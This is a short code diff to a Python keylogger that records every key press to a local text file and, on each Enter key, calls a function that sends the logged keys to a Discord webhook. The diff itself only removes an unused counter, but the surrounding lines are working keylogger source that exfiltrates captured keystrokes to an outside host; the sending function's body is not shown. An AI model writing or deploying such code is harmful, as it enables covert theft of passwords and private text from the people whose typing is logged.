@@ -9,19 +9,14 @@ import requests, time, os
 # Webhook URL (for the Discord server)
 url = 'The webhook'
 
-# Global variable
-replace = 0
-
 
 def on_press(key):
-    global replace
     with open('txt', 'a') as f: # IMPORTANT: You NEED to create a text file for this, or else it will not work. Replace the 'txt' in every open function with the name of your text file.
         k = str(key).replace("'", "")
         print(f'{key}')
         if k.find('space') > 0:
             f.write(' ')
         elif k.find('enter') > 0:
-            replace += 1
             time.sleep(0.5)
             discordchannelsend()
             print('The Keylogger Logged some Keys!')
